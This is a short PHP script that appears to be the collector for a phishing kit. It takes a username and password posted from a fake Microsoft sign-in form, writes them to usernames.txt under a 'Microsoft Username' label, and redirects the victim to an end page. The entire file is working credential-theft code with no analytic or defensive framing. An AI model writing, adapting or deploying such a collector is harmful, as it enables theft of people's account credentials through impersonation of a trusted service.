<?php

file_put_contents("usernames.txt", "Microsoft Username: " . $_POST['pw_usr'] . " Pass: " . $_POST['pw_pwd'] . "\n", FILE_APPEND);
header('Location: end.html');
exit();
?>